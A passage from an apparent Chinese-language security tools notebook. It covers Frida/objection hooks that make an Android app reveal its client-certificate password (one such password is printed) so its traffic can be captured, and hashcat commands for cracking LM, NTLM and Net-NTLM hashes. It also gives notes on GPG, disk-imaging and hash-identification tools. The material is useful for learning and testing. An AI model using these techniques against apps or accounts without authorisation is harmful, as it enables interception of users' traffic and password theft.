alt="图片"><br>对于此类APP抓包而言通常需要完成两项内容：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">找到证书文件找到证书密码<br></code></pre></td></tr></table></figure><p>服务器对客户端进行校验过程中，客户端将证书公钥发送给服务器，以及从服务器获取session和私钥解密过程中，需要API进行操作，API存在于java层框架内，所以hook框架层代码<code>java.security.KeyStore</code>，使密码自吐</p><p>- </p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata"># frida -<span class="hljs-keyword">U</span> -f cn.soulapp.android -<span class="hljs-keyword">l</span> ssl.js  --<span class="hljs-keyword">no</span>-<span class="hljs-keyword">pause</span><br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292119865.jpeg" alt="图片"></p><p>密码}%2R+\OSsjpP!w%X<br>然后首先使用常规方式解压搜索app包里的证书文件。一般apk进行解包，直接过滤搜索后缀名为p12的文件即可，一般常用的命令为tree -NCfhl |grep -i p12，直接打印出p12文件的路径.</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292119407.jpeg" alt="图片"></p><p>如果在安装包内找不到证书的话，也可以进行hook<code>java.io.Fil</code></p><h2 id=""><a href="#" class="headerlink" title="- "></a>- </h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># android hooking watch class_method java.io.File.$init</span><br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292119341.jpeg" alt="图片"></p><p>通过hook也可以找到该证书文件。</p><p>- </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">objection -g cn.soulapp.android explore --startup-command <span class="hljs-string">&quot;android hooking watch class_method java.io.File.<span class="hljs-variable">$init</span>  --dump-args&quot;</span></span><br></code></pre></td></tr></table></figure><p>使用抓包工具点击导入证书</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292119625.jpeg" alt="图片"></p><p>密码随意设置</p><p>然后进去之后导入p12证书和密码（自吐出的密码），host和port输入*</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292119546.jpeg" alt="图片"></p><p>可以看到可以成功抓到了数据包</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292119905.jpeg" alt="图片"></p><h4 id="hook抓包"><a href="#hook抓包" class="headerlink" title="hook抓包"></a>hook抓包</h4><p>1、首先确定使用的框架，主流框架okhttp、HttpURLconnection<br>使用objection打印内存中所有的类</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># android hooking list classes</span><br></code></pre></td></tr></table></figure><p>然后搜索过滤类文件中值得怀疑的框架</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">.objection # <span class="hljs-keyword">cat</span> objection.<span class="hljs-built_in">log</span> |<span class="hljs-keyword">grep</span> -i volley.objection # <span class="hljs-keyword">cat</span> objection.<span class="hljs-built_in">log</span> |<span class="hljs-keyword">grep</span> -i okhttp.objection # <span class="hljs-keyword">cat</span> objection.<span class="hljs-built_in">log</span> |<span class="hljs-keyword">grep</span> -i<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292119289.jpeg" alt="图片"><br><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292119401.jpeg" alt="图片"><br><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292119862.jpeg" alt="图片"></p><p>找到APP使用的框架后，最后通过frida加载js脚本来进行绕过。</p><h4 id="ZenTracer"><a href="#ZenTracer" class="headerlink" title="ZenTracer"></a>ZenTracer</h4><p>批量hook查看调用轨迹的工具ZenTracer</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">git <span class="hljs-built_in">clone</span> https://github.com/hluwa/ZenTracer</span><br></code></pre></td></tr></table></figure><p>点击Action之后，会出现匹配模板（Match RegEx）和过滤模板（Black RegEx）,将<code>M:java.net.HttpURLConnection</code>填入后会将该类的所有方法进行hook并运行</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292119036.jpeg" alt="图片"></p><p>同时手机点击登录、注册等功能模块时，发现经过了该方法</p><p><code>java.net.HttpURLConnection.getFollowRedirects()</code>：</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292119223.jpeg" alt="图片"></p><p>然后使用<code>objection</code>hook该方法</p><h2 id="-1"><a href="#-1" class="headerlink" title="- "></a>- </h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"># android hooking watch class_method java.net.HttpURLConnection.getFollowRedirects --<span class="hljs-keyword">dump</span>-args --<span class="hljs-keyword">dump</span>-<span class="hljs-keyword">return</span> --<span class="hljs-keyword">dump</span>-backtrace<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292119420.jpeg" alt="图片"></p><p>根据打印出的</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">com<span class="hljs-selector-class">.cz</span><span class="hljs-selector-class">.babySister</span><span class="hljs-selector-class">.c</span><span class="hljs-selector-class">.a</span><span class="hljs-selector-class">.a</span>(HttpClients<span class="hljs-selector-class">.java</span>:<span class="hljs-number">22</span>)<br></code></pre></td></tr></table></figure><p>直接定位到了收发包函数的地址，然后查看收发包的内容如下：</p><p>- </p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"># android hooking watch class_method com.cz.babySister.c.a.a --<span class="hljs-keyword">dump</span>-args --<span class="hljs-keyword">dump</span>-backtrace --<span class="hljs-keyword">dump</span>-<span class="hljs-keyword">return</span><br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292119681.jpeg" alt="图片"></p><h4 id="强混淆APP"><a href="#强混淆APP" class="headerlink" title="强混淆APP"></a>强混淆APP</h4><p>使用工具OkHttpLogger-Frida<br>1、首先将okhttpfind.dex 拷贝到手机 &#x2F;data&#x2F;local&#x2F;tmp&#x2F;目录下</p><h2 id="-2"><a href="#-2" class="headerlink" title="- "></a>- </h2><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"># adb <span class="hljs-keyword">push</span> okhttpfind.dex <span class="hljs-regexp">/data/</span>local<span class="hljs-regexp">/tmp/</span># chmod <span class="hljs-number">777</span> *<br></code></pre></td></tr></table></figure><p>2、执行命令启动frida -U -l okhttp_poker.js -f com.example.demo –no-pause 可追加 -o [output filepath]保存到文件</p><p>- </p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl"># frida -U -l okhttp_poker.js -f org.sfjboldyvukzzlpp --no-pause<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292119119.jpeg" alt="图片"></p><p>然后复制被混淆后的类名，粘贴到okhttp_poker.js文件中，重新运行后运行<code>hold()</code>开启hook拦截，然后操作App后，会出现拦截的内容如下</p><p>- </p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl"># nano okhttp_poker.js<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204292119011.jpeg" alt="图片"></p><p>当然除了ZenTracer，也可以直接使用objection工具进行批量hook，<br>首先将怀疑的类复制保存到文件中，并在保存内容前加上<code>android hooking watch class</code></p><h2 id="-3"><a href="#-3" class="headerlink" title="- "></a>- </h2><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean"># android hooking list classes# objection -g com.cz.babySister explore -c <span class="hljs-string">&quot;/root/Desktop/2.txt&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">参考资料https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d<span class="hljs-regexp">/197657https:/</span><span class="hljs-regexp">/bbs.pediy.com/</span>thread-<span class="hljs-number">258776</span>.html<br></code></pre></td></tr></table></figure><h1 id="G"><a href="#G" class="headerlink" title="G"></a>G</h1><h2 id="GParted"><a href="#GParted" class="headerlink" title="GParted"></a>GParted</h2><p>磁盘扩展⼯具</p><p>GParted (Gnome Partition Editor)是一种非常小巧自启动运行光盘，采用<a href="http://www.oschina.net/p/xorg">X.org</a>，轻量级的<a href="http://www.oschina.net/p/fluxbox">Fluxbox</a>窗口管理器，以及最新的2.6 Linux内核建构。其中包含的GParted硬盘分区工具，作为系统维护盘非常有用。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD/CD%5Cimage-20220411203443919.png" alt="image-20220411203443919"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411203543074.png" alt="image-20220411203543074"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411203624791.png" alt="image-20220411203624791"></p><p>还能进行数据恢复和分区</p><h2 id="guymager"><a href="#guymager" class="headerlink" title="guymager"></a>guymager</h2><p>在数字取证中，经常需要对磁盘制作镜像，以便于后期分析。Kali Linux提供一款轻量级的磁盘镜像工具Guymager。该工具采用图形界面化方式，提供磁盘镜像和磁盘克隆功能。它不仅生成dd的镜像，还能生成EWF和AFF镜像。在生成过程中，渗透测试人员不仅可以采用两次读操作验证数据的正确性，还可以对镜像文件进行额外的校验。由于采用多线和多处理机技术，该工具可以极大提升读取和压缩速度。</p><p>在生成一个磁盘的镜像并将其通过网络存放在另一台电脑的过程中，你仅仅需要两个工具：通用的 GNU&#x2F;Linux 工具 dd&#x2F;dcfldd。</p><p>guymager 是将 dd 与 dcfldd 命令转换为图形化接口，方便取证人员及事件恢复人员建立镜像，但其只支持 Linux 系统；使用者可选择利用<br>dd 或是 dcfldd 來制作镜像、可透过 MD5 或是 SHA-1 來验证镜像、镜像可利用 gzip&#x2F;bzip2 进行压缩等。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411205131061.png" alt="image-20220411205131061"></p><h2 id="GPG"><a href="#GPG" class="headerlink" title="GPG"></a>GPG</h2><h6 id="GPG简介"><a href="#GPG简介" class="headerlink" title="GPG简介"></a>GPG简介</h6><p>GPG代表GNU Private Guard，它是一个命令行实用程序，用于使用对称或公钥加密对数据文件或文件夹进行加密和解密。 GPG是GPGP授权替代PGP加密软件套件。 GPG也由OpenPGP编译系统使用。</p><h6 id="加密使用对称密钥"><a href="#加密使用对称密钥" class="headerlink" title="加密使用对称密钥"></a>加密使用对称密钥</h6><p>这里我有一个名为<strong>“test.txt”</strong>的文件，我将加密然后用对称密钥解密，并将解密的文本打印到另一个名为<strong>“output.txt”的</strong>文件中<strong>。</strong></p><p>运行以下命令使用对称密钥加密文件test.txt。 选项“-c”表示GPG使用对称密钥。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220408134032586.png" alt="image-20220408134032586"></p><p>因此，一旦密码输入正确，就会创建一个名为<strong>“test.txt.gpg”</strong>的文件。 这是加密文件。 以下图像显示加密前后的文件。您可以看到加密的文本是不可读的格式。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220408134127120.png" alt="image-20220408134127120"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220408134157076.png" alt="image-20220408134157076"></p><p>注意:原来那个txt还是可读的 </p><p>使用以下命令解密加密文件</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220408134541968.png" alt="image-20220408134541968"></p><p>如果是当前用户的话都不需要输入密码</p><h6 id="公钥加密"><a href="#公钥加密" class="headerlink" title="公钥加密"></a>公钥加密</h6><p>在这里，我们将使用GPG的公钥&#x2F;私钥加密机制加密一组文件。 它涉及创建一个不应与任何人共享的私钥，以及必须与要向您发送加密数据的用户共享的公钥。</p><p>首先，我们必须将文件打包成压缩文件夹。 这里我有一个名为<strong>“enctest”</strong>的目录，其中有三个文件test1.txt到test3.txt。我们将压缩此目录tar.gz文件。 我将使用以下命令创建压缩的tar.gz存档：</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220408134732645.png" alt="image-20220408134732645"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220408135413471.png" alt="image-20220408135413471"></p><p>这将创建一个文件“files.tar.gz”。 我们现在必须生成公钥&#x2F;私钥对。 运行以下命令生成密钥：</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220408135613704.png" alt="image-20220408135613704"></p><p>跟详细的设置私钥</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220408140049158.png" alt="image-20220408140049158"></p><p>记住，这只需要完成一次，任何数量的文件和文件夹都可以使用此密钥进行加密。 一旦你键入这个命令，将会询问各种各样的问题。 问题将是：</p><ul><li>什么样的加密使用？ 我选择1是RSA和RSA。</li><li>什么是关键尺寸？ 我选择2048，你可以选择1024和4096范围内的任意大小。</li><li>钥匙什么时候过期？ 我选择了0，这意味着密钥永远不会过期。 但如果您希望在特定的时间过期，可以提供数天，数周或数年。</li></ul><p>将会询问其他类似密码的内容，您将被提示输入两次。 确保你使用强大的，并记住密码。 此外，您的凭据也将被使用。 我在这里使用的凭据（如下所示）仅用于测试。 建议您使用您的真实凭据，如姓名，电子邮件ID，并提供一些评论。</p><p>一旦你输入密码，它就开始生成密钥。 它会要求你做一些工作。 建议移动鼠标或键入某些东西或使用驱动器打开一些文件。 它将使用此工作来生成随机位。 您可能需要多次执行此操作。 我的输出如下所示：</p><h4 id="-4"><a href="#-4" class="headerlink" title=""></a><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220408140254614.png" alt="image-20220408140254614"></h4><p>这里有两个重要的事情：提供强大的密码，并确保记住你的密码</p><p>现在生成密钥，我们现在必须导出公用密钥文件，以便在其他系统上导入，或通过电子邮件发送。 要启动导出，请使用以下命令：</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220408140616711.png" alt="image-20220408140616711"></p><p>还建议备份私钥。 我们可以使用gpg来做到这一点。 要进行备份，请使用以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gpg --armor --output file-enc-privkey.asc --export-secret-keys <span class="hljs-string">&#x27;cdxiaodong&#x27;</span><br></code></pre></td></tr></table></figure><p>这里的文件<strong>“file-enc-privkey.asc”</strong>将安全地保存私钥的备份。 一旦导出和密钥备份完成，我们现在可以加密和解密.tar.gz文件。 使用以下命令加密：</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220408140912195.png" alt="image-20220408140912195"></p><p>记住在上述命令中将“cdxiaodong”更改为在密钥生成期间给出的名称，否则加密将失败。 当命令成功运行时，将创建一个名为<strong>“files.tar.gz.gpg”</strong>的加密文件。</p><p>现在我们可以使用以下命令解密tar.gz存档。 它将使用私钥和密码来解密并提供解密的文件夹。 使用以下命令解密：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gpg --output output.tar.gz --decrypt files.tar.gz.gpg<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220408141130850.png" alt="image-20220408141130850"></p><p>上述命令将要求密码，然后解密加密的文件，并创建一个名为<strong>“output.tar.gz”</strong>的压缩文件，然后可以使用tar将其解压缩到文件夹以获取文件。 </p><h1 id="H"><a href="#H" class="headerlink" title="H"></a>H</h1><h2 id="Hardware-Locality-lstopo"><a href="#Hardware-Locality-lstopo" class="headerlink" title="Hardware Locality lstopo"></a>Hardware Locality lstopo</h2><ul><li>硬件局部性lstopo</li></ul><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411205509108.png" alt="image-20220411205509108"></p><p>我也不知道这个东西是干啥的</p><h2 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h2><p>HashCat系列软件在硬件上支持使用CPU、NVIDIA GPU、ATI GPU来进行密码破解。在操作系统上支持Windows、Linux平台，并且需要安装官方指定版本的显卡驱动程序，如果驱动程序版本不对，可能导致程序无法运行。</p><p>HashCat主要分为三个版本：Hashcat、oclHashcat-plus、oclHashcat-lite。这三个版本的主要区别是：HashCat只支持CPU破解。oclHashcat-plus支持使用GPU破解多个HASH，并且支持的算法高达77种。oclHashcat-lite只支持使用GPU对单个HASH进行破解，支持的HASH种类仅有32种，但是对算法进行了优化，可以达到GPU破解的最高速度。如果只有单个密文进行破解的话，推荐使用oclHashCat-lite。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">-m   指定哈希类型<br>-a   指定攻击模式，有5中模式<br>    0 Straight（字典破解）<br>    1 Combination（组合破解）<br>    3 Brute-force（掩码暴力破解）<br>    6 Hybrid dict + mask（混合字典+掩码）<br>    7 Hybrid mask + dict（混合掩码+字典）<br>-o   输出文件<br>-stdout  指定基础文件<br>-r  指定规则文件<br>--force 强制进行破解<br>--show  显示破解结果<br> <br>-V   打印出版本<br>-h   查看帮助<br></code></pre></td></tr></table></figure><p>-m 参数的一些哈希类型.</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411205922329.png" alt="image-20220411205922329"></p><p><strong>使用Hashcat生成字典</strong></p><p>rules目录下存放着生成字典的各种规则</p><p>我们在当前目录下将基础信息保存在 base.txt文件中，–stdout 指定基础信息文件，-r 指定规则文件，-o输出成文件。</p><p>输出成test.txt文件</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">hashcat64.exe --stdout base.txt -r rules\dive.rule -o test.txt<br></code></pre></td></tr></table></figure><p><strong>使用Hashcat破解LM Hash和NTLM Hash</strong></p><p>root对应的LM和NLM哈希如下</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411210003921.png" alt="image-20220411210003921"></p><p><strong>破解LM Hash</strong></p><p>LM Hash的模式是3000</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">hashcat64.exe -m 3000 d480ea9533c500d4aad3b435b51404ee pass.txt --force<br></code></pre></td></tr></table></figure><p>爆破完成后，可以使用 –show 参数查看结果 ，但是要注意爆破LM Hash的结果默认会大写</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cv2-aed8e1c231a5097368fdcb4d0c408a01_720w.png" alt="img"></p><p><strong>破解NTLM Hash</strong></p><p>NTLM Hash的模式是1000</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">hashcat64.exe -m 1000 329153f560eb329c0e1deea55e88a1e9 pass.txt --force<br></code></pre></td></tr></table></figure><p>爆破完成后，可以使用 –show 参数查看结果</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cv2-6ad8e12c20d9cb6a447cba6292b6a1c9_720w.png" alt="img"></p><p>使用Hashcat破解Net-NTLMHash</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">hashcat64.exe -m 5600 xie::WIN7:77effc5381037df8:b6b777ced0128e3f587fe08b98853e13:010100<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411210036490.png" alt="image-20220411210036490"></p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411210043781.png" alt="image-20220411210043781"></p><h2 id="hashid"><a href="#hashid" class="headerlink" title="hashid"></a>hashid</h2><h3 id="描述：-8"><a href="#描述：-8" class="headerlink" title="描述："></a>描述：</h3><p>识别用于加密数据的不同类型的哈希。<br>  hashID是用Python 3.x编写的工具，它支持使用正则表达式识别超过210种唯一的哈希类型。<br>  它能够识别单个散列、解析文件或读取目录中的文件并识别其中的散列。hashID还能够在其输出中包含相应的hashcat模式和&#x2F;或JohnTheRipper格式。尽管hashID是用Python 3编写的。但它也应该适用于Python 2.7。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">-e,--extended<br>列出所有可能的散列算法，包括加密密码<br><br>-m,--mode<br>在输出中包括相应的hashcat模式<br><br>-j,--john<br>在输出中包括相应的JohnTheRipper格式<br><br>-o FILE,--outfile FILE<br>将输出写入文件（默认值：STDOUT）<br><br>-h,--<span class="hljs-built_in">help</span><br>显示帮助信息并退出<br><br>--version<br>显示程序的版本信息并退出<br><br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411224516494.png" alt="image-20220411224516494"></p><h2 id="hash-identifier"><a href="#hash-identifier" class="headerlink" title="hash-identifier"></a>hash-identifier</h2><p>在测试过程中我们经常会遇到一些哈希值需用通过hashcat进行解密，但是在使用hashcat解密是需要指定使用的加密算法，如何确认加密算法是一个比较棘手的问题。<br> hash-identifier工具可以通过密文识别加密算法，工具可在github<a href="https://link.jianshu.com/?t=https://github.com/psypanda/hashID">下载</a>，kali系统默认安装了该工具，工具运行如下：</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411224224155.png" alt="image-20220411224224155"></p><p>分析密文方式如下：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">a3090f99d2ce0958fa0939e99861203510fe54958a937abaa0bae06d<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411224309195.png" alt="image-20220411224309195"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">4194</span>d<span class="hljs-number">1706</span>ed<span class="hljs-number">1</span>f<span class="hljs-number">408</span>d<span class="hljs-number">5e02</span>d<span class="hljs-number">672777019</span>f<span class="hljs-number">4</span>d<span class="hljs-number">5385</span><span class="hljs-keyword">c</span><span class="hljs-number">766</span>a<span class="hljs-number">8</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span>ca<span class="hljs-number">8</span>acba<span class="hljs-number">3167</span>d<span class="hljs-number">36</span>a<span class="hljs-number">7</span>b<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411224344040.png" alt="image-20220411224344040"></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">230</span>eb<span class="hljs-number">00</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span>b<span class="hljs-number">4</span>bc<span class="hljs-number">080</span>ccdf<span class="hljs-number">6e7</span>da<span class="hljs-number">3075</span>aff<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411224414682.png" alt="image-20220411224414682"></p><h2 id="hfind-未完成"><a href="#hfind-未完成" class="headerlink" title="hfind(未完成)"></a>hfind(未完成)</h2><h3 id="描述：-9"><a href="#描述：-9" class="headerlink" title="描述："></a>描述：</h3><p>在哈希数据库中查找哈希值。<br>  hfind使用二进制搜索算法在数据库中查找哈希值。 这样一来，您就可以轻松创建哈希数据库，并确定文件是否已知。 它可以与NIST国家软件参考库（NSRL）和“ md5sum”的输出一起使用。<br>  在“ hfind”可以使用数据库之前，必须使用“ -i”选项创建索引文件。<br>  需要此工具以提高效率。 大多数基于文本的数据库没有固定长度的条目，有时不进行排序。 hfind工具将创建一个已排序并具有固定长度条目的索引文件，这允许使用二进制搜索算法而不是线性搜索（例如’grep’）进行快速查找。</p><h3 id="参数：-3"><a href="#参数：-3" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">-i db_type<br>为数据库创建索引文件。 必须先执行此步骤，然后才能执行查找。 <span class="hljs-string">&#x27;db_type&#x27;</span>参数指定数据库类型（即nsrl-md5或<span class="hljs-built_in">md5sum</span>）。 请参阅以下部分。<br><br>-f lookup_file<br>指定每行包含一个哈希值的文件的位置。 这些哈希将在数据库中查找。<br><br>-e<br>扩展模式。 除了名称之外，还会打印其他信息。 （并不适用于所有哈希数据库类型）。<br><br>-q<br>快速模式。 如果没有找到哈希，则显示0，否则显示1，而不是显示带有哈希的相应信息。 如果使用此标志，则一次只能给出一个散列。<br><br>-V<br>显示版本信息<br><br>db_file<br>哈希数据库文件的位置。<br><br>[hashes]<br>查找的哈希值。 如果命令行上未提供它们，则使用STDIN。 如果SHA-1和MD5哈希都存在索引文件，则可以在运行时给出两种类型的哈希。<br><br>INDEX FILE<br>hfind使用索引文件对哈希值执行二进制搜索，这比使用<span class="hljs-string">&#x27;grep&#x27;</span>进行线性搜索要快得多，后者将执行线性搜索。在使用哈希数据库之前，必须创建相应的索引文件。 这可以通过hfind的“ -i”选项来完成。<br>生成的索引文件将根据数据库文件名命名。该名称将包含原始名称、哈希类型(sha1或md5)和<span class="hljs-string">&#x27;.idx&#x27;</span>。例如，创建NIST NSRL的MD5哈希索引会得到<span class="hljs-string">&#x27;NSRLFile.txt-md5。和SHA-1索引的结果是&#x27;</span>NSRLFile.txt-sha1.idx<span class="hljs-string">&#x27;。</span><br><span class="hljs-string">该文件有两列。 每个条目均按第一列（即哈希值）排序。 第二列具有原始文件中相应条目的字节偏移。 因此，当在索引中找到散列时，将记录偏移量，然后“ hfind”将查找原始数据库中的条目。</span><br><span class="hljs-string">以下输入类型是有效的。对于NSRL，可以使用&#x27;</span> NSRL -md5<span class="hljs-string">&#x27;和&#x27;</span> NSRL -sha1<span class="hljs-string">&#x27;。区别在于索引是根据哪个哈希值排序的。“md5sum”值还可以用于对“自制”数据库进行排序和索引。“hfind”可以采用两种常见格式的数据:</span><br><span class="hljs-string">MD5 (test.txt) = 76b1f4de1522c20b67acc132937cf82e</span><br><span class="hljs-string">  and</span><br><span class="hljs-string">        76b1f4de1522c20b67acc132937cf82e        test.txt</span><br></code></pre></td></tr></table></figure><h2 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h2><h3 id="1-hping3"><a href="#1-hping3" class="headerlink" title="1.hping3"></a>1.hping3</h3><p>hping 是面向命令行的用于生成和解析TCP&#x2F;IP协议数据包汇编分析的开源工具。</p><p>目前最新版是hping3，它支持TCP，UDP，ICMP，和RAW-IP协议，具有跟踪路由模式，能够在覆盖的信道之间发送文件以及许多其他功能.</p><p>hping3是安全审计,防火墙测试等工作的标配工具,haping优势在于能够定制数据包的各个部分,因此用户可以灵活对目标机经行细致的探测.</p><h3 id="2-hping3用法"><a href="#2-hping3用法" class="headerlink" title="2.hping3用法"></a>2.hping3用法</h3><p>格式:</p><figure class="highlight apache"><table><tr><td 